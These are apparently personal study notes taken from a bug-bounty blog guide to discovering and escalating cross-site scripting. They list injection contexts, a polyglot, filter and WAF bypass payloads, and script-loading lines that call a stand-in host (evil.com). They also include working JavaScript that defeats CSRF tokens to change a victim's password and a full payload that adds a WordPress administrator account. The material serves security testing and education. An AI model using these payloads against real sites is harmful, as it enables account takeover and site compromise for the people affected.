
source: https://www.bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/



How I Built An XSS Worm On Atmail ---
https://labs.bishopfox.com/tech-blog/2017/06/how-i-built-an-xss-worm-on-atmail

The Root Cause of XSS vulnerabilities::

XSS occurs when user input is not properly escaped when it is reflected back to the application, allowing client-side JavaScript to be injected in a manner allows it to execute.


url encoding like space = %20

url encode/decode online tool: https://meyerweb.com/eric/tools/dencoder/





INSIDE NORMAL HTML TAGS
<p>{{injection}}</p>


DOUBLE QUOTED HTML TAG ATTRIBUTES
<input type="text" value="{{injection}}">


SINGLE QUOTED HTML TAG ATTRIBUTES
<input type="text" value='{{injection}}'>


UNQUOTED HTML TAG ATTRIBUTES
<input type="text" value={{injection}}>


HTML COMMENTS
<!-- {{injection}} -->


HTML EVENT HANDLERS
<img src=x onerror="{{injection}}">


WITHIN SCRIPT TAGS
<script>var x = "{{injection}}";</script>


URLS
<a href="{{injection}}">click me</a>


The list above is non-exhaustive, there are many other contexts that you will encounter in your quest to uncover XSS vulnerabilities. The most important thing is that you are aware of the context that you are injecting into, and have some idea of how you might be able to escape or abuse that context to achieve XSS.








XSS Discovery Methods:
-----------------------

MANUAL:
--------
Nothing will uncover XSS vulnerabilities as thoroughly as manually going through each parameter, testing for injection, checking the context, and attempting to exploit it manually. It can be a slow, grinding process, but ultimately going to this much trouble will allow you to uncover vulnerabilities that others will miss.





XSS POLYGLOTS:
----------------
An XSS polyglot is a string that is able to inject into multiple different contexts and still result in JavaScript execution. One of the most famous XSS polyglots was created by 0xSobky. I’ve included it below. It works in over 20 contexts, so spraying this throughout an application is a decent way to discover XSS vulnerabilities.

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
You can find the full details including an analysis by visiting the dedicated Github repository.
link: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

The downside to polyglots is that they’re easily detected by web application firewalls (WAFs), they tend to be quite long in terms of character length, and they don’t work in every context.






BASIC XSS FILTER BYPASSES:
---------------------------



 The most basic (and ineffective) filter is a simple string search. For example, there might be some logic in the backend that searches for the word “script”, and returns a 403 error if it is found.

The backend code might look something like this:

<html>
<head><title>MyApp</title></head>
<body>

<?php
$name = $_GET['name'];
if (strpos($name, 'script') !== false) {
    http_response_code(403);
    die('Forbidden');
}
?>

Welcome to MyApp, <?php echo $_GET['name']; ?>

</body>
</html>
Now, if we try to inject <script>alert(1)</script>, it won’t work:



HTML EVENT ATTRIBUTES:
----------------------

We’re not cooked just yet, because there are many ways to execute JavaScript without <script> tags. For example:

<img src=x onerror=alert(1)>
The full URL would be:

http://localhost:8000/?name=%3Cimg%20src=x%20onerror=alert(1)%3E


In this case, we’ve used a handy little feature called HTML Event Attributes. They allow you to specify JavaScript to execute when a specific event occurs. In this case, we have attempted to load an image with the src attribute set to “x”. Of course, there is no image hosted at “x”, so an error occurs. When an error occurs, the onerror Event attribute is fired, which we set to be alert(1). A good list of event attributes can be found here: https://www.w3schools.com/tags/ref_eventattributes.asp ( it's good)





ALERT IS BLOCKED:
-----------------

Another common blacklisted word is “alert”, which can be bypassed easily by using prompt(1), console.log(1), or literally anything else.

BRACKETS ( ) ARE BLOCKED:
-------------------------

Javascript is a strange language. For some reason it allows you to use backticks instead of brackets when passing strings to a function. i.e. alert`1` instead of alert(1). This has saved me on multiple occasions.



Strings are blocked:
-----------------------

Sometimes you will run into situations where you can not form a string, maybe because quotes are blocked, or some other reason. In this case, String.fromCharCode can be really handy. It takes ASCII codes, and then turns them into a string, for example this payload:

alert(String.fromCharCode(88,83,83))
Will create an alert box with the characters corresponding to 88, 83 and 83. Which just happens to be XSS:



--------------------------------
OTHER BYPASSES:
---------------

Bypassing XSS filters is a very, very deep rabbit hole. People dedicate their lives to this kind of stuff. Just as an example, here’s a Cloudflare WAF bypass from 2019:

The tweet is here: https://twitter.com/bohdansec/status/1135699501707091968

The payload is: <svg onload=prompt%26%230000000040document.domain)>

It works by adding 8+ superfluous leading zero’s to the start of a decimal (or hex) encoded character, which Cloudflare did not account for in their checks.

These kinds of bypasses pop up every now and then for major WAFs, and many bug bounty hunters have their own ones that they keep secret. Once they’re publicly known, they tend to get patched fairly quickly by WAF vendors.

------------------------------------------------------------------------------------------------------------
(((( This is my favourite resource for more advanced filter bypass examples:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads )))))
------------------------------------------------------------------------------------------------------------





XSS Escalation Methods ::
-------------------------
------------------------------



You can use your browser console ( tap F12 for see it) to test XSS payloads ( complex payloads)







INCLUDING LONGER PAYLOADS:
-------------------------
If you’re escalating your XSS beyond an alert box, it’s quite likely that you will want to include a much longer script. This can be done by loading an external .js file. There are a couple of ways to do this. The most generic way is simply to provide a src attribute in a script tag:

<script src="http://nw.rs"></script>
The page at http://nw.rs just happens to include some basic JavaScript as shown below, but it could include any length of JavaScript, even thousands of lines.



Another method of loading external JavaScript is using JQuery’s getScript() function:

$.getScript("http://nw.rs",function(){});
Most modern applications will have JQuery at your disposal, so this is a very handy tip if your XSS is in a JavaScript context, rather than a HTML one.

A word of warning: if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error





BYPASSING THE SOP:
---------------------
Perhaps the greatest thing about finding XSS on an application is that it allows you to completely bypass the Same Origin Policy (SOP). The SOP basically forbids JavaScript from one origin requesting data from another origin unless it is explicitly allowed by a CORS policy. If you find an XSS on the target application, you really don’t need to worry about this, because the JavaScript that you inject will be executed within that application as if it had been hard coded. In other words, the JavaScript that you inject is already coming from the same origin!

Additionally, if the exploited user is authenticated to the vulnerable application, your JavaScript will be executing within the context of that authenticated session.

Why is this so important? Because it means that the JavaScript you inject has the power to do pretty much anything that the user can do. This might include submitting forms, updating profile details, making comments, installing plugins, updating passwords etc.



BYPASSING CSRF TOKENS:
----------------------

Once we have XSS, how can we submit a form that requires a CSRF token? There are a couple of different methods. The first is by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, and we can simply interact with that form using JavaScript. This method was shown to me by Justin Gardner (Rhynorater). The code is also available in one of my Github repositories, which we’ll look at later in this blog: https://raw.githubusercontent.com/hakluke/weaponised-XSS-payloads/master/iframe_template.js.

 

frame=document.createElement("iframe")
frame.addEventListener("load", function() {
    // Wait 1 second after the iframe loads to ensure that the DOM has loaded
    setTimeout(function(){
        //Set new password

frame.contentDocument.getElementById("NewPassword").value="1337H4x0rz!!!"
        //Set confirm password

frame.contentDocument.getElementById("ConfirmNewPassword").value="1337H4x0rz!!!"
        //Click the submit button
        frame.contentDocument.getElementById("SubmitButton").click()
        setTimeout(function(){
            //Wait a couple seconds for the previous request to be sent
            alert("Your account password has been changed to 1337H4x0rz!!!")
        }, 2000)
    }, 1000)
});

frame.src="https://example.com/sensitive/action.php"
document.body.append(frame)
The other method is a little more complicated, but I think that it creates more reliable payloads. Essentially, you request the page that contains the form, pull out the CSRF token using regex, and then include that token in your form request. Here’s an example of that method on a fictitious application.

var req = new XMLHttpRequest();
var url = "/changepassword.php";
var regex = /token" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "action=changepassword&csrf_token="+nonce+"&new_password=pwn3d";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);





ACCOUNT TAKEOVERS:
----------------------
=======================

Now that we can bypass SOP and CSRF protections, it is quite trivial to build a PoC that will take control of a user’s account either by updating their password directly, or updating their email address (which can then be used to reset the password through the forgot password functionality).

I wrote a whole blog about escalating XSS using these methods
link: https://hakluke.medium.com/upgrade-xss-from-medium-to-critical-cb96597b6cc4

, but to summarise, we use the methods above to change the user’s profile in a way that would allow an account takeover. For example, we could:

Change the user’s password
Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
Change the user’s security questions
I also included a repository full of payloads for popular platforms such as WordPress, Drupal and MyBB.

link: https://github.com/hakluke/weaponised-XSS-payloads

 As an example, here’s a payload that will add a new admin user on a WordPress instance.

var wp_root = "http://example.com" // don't add a trailing slash
var req = new XMLHttpRequest();
var url = wp_root + "/wp-admin/user-new.php";
var regex = /ser" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=hacker@example.com&pass1=AttackerP455&pass2=AttackerP455&role=administrator";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);


How To do:::
=========


The simplest way to use these payloads is to host them somewhere and load them into the src attribute of a script tag for your XSS payload like this:

<script src="http://evil.com/wordpress_create_admin_user.js"></script>
Alternatively, depending on the context and length of the payload, it can sometimes be minified, encoded and then just included directly into the request.

In order to host the JavaScript file, you may need to set the Content-Type to application/javascript. To achieve this with PHP, you can simply prepend this line to the top of any of the payloads, save it as a .php file and host it on your PHP-enabled webserver:

<?php header("Content-Type: application/javascript"); ?>





LENGTH LIMITED PAYLOADS:
========================
Sometimes, you’ll get an injection that needs to be under a specific amount of characters. The shortest payload I know of that does not pull an external script is 20 characters long:

<svg/onload=alert()>
The shortest payload I know of that does pull an external script is 27 characters:

<script/src=//㎻.₨></script>
This payload uses a trick where a single unicode character gets split into two normal characters by the browser, which means that you can take a 5 character domain such as nw.rs and shorten it down to 3 characters: ㎻.₨, the browser will just convert it back to 5 characters and fetch the script as if nothing happened.

Note that the payloads above are the shortest ones I know of that can be executed within a plain HTML context. In other contexts, you may have much shorter payloads, 

for example,***** you might already be in a JavaScript context, where the whole payload could just be alert(1). ******

(((( first know what context it is .... mane holo payload ta kothai dicci je ta ki html naki javascript er vitore 
naki url er vitore naki etc )))))







LINK INJECTION:
===============

You can execute JavaScript with the javascript: protocol. Don’t believe me? Go ahead, paste javascript:alert(document.domain) into your browser’s address bar right now, and press enter!

This can be injected into anywhere that a link will exist, for example, in a <a> tag:

<a href="javascript:alert(document.domain)>click me</a>
When that link is clicked, the JavaScript will execute.




REFERER HEADER XSS:
=====================

This hasn’t really been possible since IE6, except maybe in some extremely rare cases. The reason is that key characters within the Referer header value are URL encoded by the browser. If you want to give this a shot for yourself, you can use this PHP code:

<html>
<head><title>MyApp</title></head>
<body>

Welcome to MyApp.

<?php echo $_SERVER['HTTP_REFERER']; ?>;

</body>
</html>
Then run the following JavaScript code in the console:

window.history.replaceState(null, '', "<script>alert(1)</script>");
window.location.replace('http://localhost:8000/');

Notice that the outcome has URL encoding for some key characters:
http://localhost:8000/%3Cscript%3Ealert(1)%3C/script%3E;


The actual alert(1) remains intact, so there are still some edge cases where it might work, but it would be very rare.





RCE VIA XSS IN ELECTRON APPS::
===============================

Electron is pretty nifty, it allows you to build desktop and mobile applications with JavaScript, HTML and CSS. Apps like VSCode, Slack, Facebook Messenger and Twitch are all built using Electron. There’s a feature called nodeIntegration, which basically allows you to run nodejs code within the application. The risks of doing this are pretty well advertised, but as with all horribly insecure misconfigurations, it still finds its way into production sometimes.

If you manage to pop an XSS in an Electron application, and nodeIntegration is enabled, you’ve got yourself a nifty little remote code execution!

For more information about this attack, I’d recommend checking Portswigger’s great writeup
(link: https://portswigger.net/daily-swig/discord-desktop-app-vulnerable-to-rce-via-chained-exploit )

 of the famous Discord XSS > RCE bug, which utilised a very similar method.





















